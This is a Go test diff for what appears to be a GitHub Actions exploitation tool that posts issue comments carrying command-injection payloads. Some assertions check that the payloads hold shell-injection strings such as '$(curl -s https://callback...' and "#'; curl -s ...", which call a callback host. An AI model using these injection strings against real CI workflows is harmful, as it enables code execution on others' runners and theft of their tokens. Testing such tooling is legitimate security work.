@@ -105,6 +105,34 @@ func TestExecuteWizardDeployment_Comment_Success(t *testing.T) {
 	assert.Equal(t, PhaseRecon, model.phase)
 	cmd()
 	assert.Equal(t, "issue", mock.lastDeployCommentReq.Target)
+	assert.Contains(t, mock.lastDeployCommentReq.Payload, "$(curl -s https://callback.smokedmeat.local/r/smokedmeat/")
+	assert.Contains(t, mock.lastDeployCommentReq.Payload, "#'; curl -s https://callback.smokedmeat.local/r/smokedmeat/")
+}
+
+func TestExecuteWizardDeployment_Comment_PrefersBashContext(t *testing.T) {
+	mock := &mockKitchenClient{
+		deployCommentResp: counter.DeployCommentResponse{CommentURL: "https://github.com/acme/api/issues/5#issuecomment-1"},
+	}
+	m := newModelForWizardDeploy(t, mock)
+	m.tokenInfo = &TokenInfo{Value: "ghp_test"}
+	m.wizard.SelectedVuln = &Vulnerability{
+		Repository:  "acme/api",
+		Workflow:    "ci.yml",
+		Context:     "comment_body",
+		BashContext: "bash_unquoted",
+		ID:          "V003",
+	}
+	m.wizard.DeliveryMethod = DeliveryComment
+	m.wizardInput.SetValue("5")
+
+	result, cmd := m.executeWizardDeployment()
+
+	model := result.(Model)
+	assert.NotNil(t, cmd)
+	assert.Equal(t, PhaseRecon, model.phase)
+	cmd()
+	assert.Contains(t, mock.lastDeployCommentReq.Payload, "$(curl -s https://callback.smokedmeat.local/r/smokedmeat/")
+	assert.NotContains(t, mock.lastDeployCommentReq.Payload, "#'; curl -s https://callback.smokedmeat.local/r/smokedmeat/")
 }
 
 func TestExecuteWizardDeployment_Comment_InvalidIssueNum(t *testing.T) {
